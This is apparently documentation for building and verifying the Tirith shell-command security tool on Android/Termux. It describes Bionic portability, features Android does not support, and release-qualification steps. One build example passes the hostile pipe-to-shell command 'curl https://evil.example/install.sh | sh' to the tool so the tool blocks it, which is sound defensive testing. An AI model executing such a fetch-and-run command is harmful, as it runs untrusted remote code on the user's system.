# Android and Termux

Android builds use Bionic rather than glibc. The Android portability changes
exclude the unsupported desktop clipboard dependency and use Bionic's errno
accessor. They permit evaluating a native source build; they do not establish
release qualification for Android.

## Build from source

Use Termux's native Rust toolchain and a reviewed checkout containing the Android
portability changes. From that checkout:

```sh
cargo build --locked --release --bin tirith
./target/release/tirith --version
./target/release/tirith check --json --non-interactive --shell posix -- 'echo hello'
./target/release/tirith check --json --non-interactive --shell posix -- 'curl https://evil.example/install.sh | sh'
```

The final command analyzes a quoted command string; it must block it and must not
execute it. A successful build or version check alone does not qualify shell
interception, policy changes, containment, or self-update.

There is no published native Android asset. The release installer refuses
Android/Termux before looking up a release, downloading an archive, or changing
an install path. Do not run it with sudo or substitute a GNU/Linux asset. The
self-updater has no Android release target and cannot update a source build from
a Linux release archive. Keep source builds updated from reviewed source.

## Available behavior and limits

| Surface | Android behavior |
| --- | --- |
| Explicit command analysis | Portable engine; verify allow/block behavior on the target device. No sudo required. |
| Clipboard scan | Reports `status: "no_backend"` without a verdict. Exit 0 means the diagnostic was returned, not that clipboard content was checked. |
| Clipboard copy | Fails with `no_backend`; never reports a successful copy. |
| Clipboard guard, daemon, and source watcher | No Android backend; refuse instead of claiming a running guard. Sudo does not enable them. |
| Required containment | No Android containment backend. Coverage is absent and an enforcing launch refuses. |
| Native package approval | Unsupported on Android. Installing sudo does not enable the x86_64 Linux authority. |
| Local npm materialization | Native publication is Linux-only; Android is refused. |
| Shell hooks | Device and shell qualification is still required; do not infer interception from a successful `check` invocation. |

Do not bypass a containment refusal with a degraded-execution option when the
workflow requires containment. An optional display server or Termux:API does
not add an Android clipboard backend to Tirith.

## Verification before broader support

A native Android release needs retained evidence for a pinned source revision,
NDK/API level, Android version, architecture, binary digest, and actual device
or emulator. Run the Android clipboard tests, directory EOF errno regressions,
command allow/block cases, required-containment refusal, package-approval
refusal, and source-build self-update refusal. Confirm that refused actions do
not execute the requested command or change the destination. Then qualify the
installed shell hooks and their interrupted-command recovery on the actual
supported shell versions.

Cross-compilation can catch type and link failures. A Linux musl run cannot
establish Bionic, Android filesystem, signal, SELinux, or shell behavior.

References: [Rust Android targets](https://doc.rust-lang.org/rustc/platform-support/android.html),
[Bionic errno API](https://android.googlesource.com/platform/bionic/+/refs/heads/main/libc/include/errno.h),
and [arboard platform coverage](https://github.com/1Password/arboard#general).
